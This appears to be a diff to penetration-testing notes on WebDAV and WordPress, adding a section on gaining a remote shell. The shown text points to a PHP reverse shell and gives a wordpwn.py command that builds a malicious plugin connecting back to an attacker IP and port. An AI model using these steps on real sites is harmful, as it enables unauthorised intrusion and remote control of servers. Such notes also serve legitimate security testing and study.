@@ -135,7 +135,7 @@ inurl:webdav site:com
 Test basic options
 
 ```
-davtest -url http://192.168.1.101 
+davtest -url http://192.168.1.101
 ```
 
 Test if it is possible to upload and execute files with webdav.
@@ -217,4 +217,20 @@ Note: My fav php shell is under
 ```
 
 from [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+### Alternative Exploitation
+
+Upload plugin ability, add a malicious one using the following python script
+
+```
+https://github.com/wetw0rk/malicious-wordpress-plugin
+```
+
+Syntax:
+
+```
+python wordpwn.py AttackingIP LPORT Y
+```
+
+
 
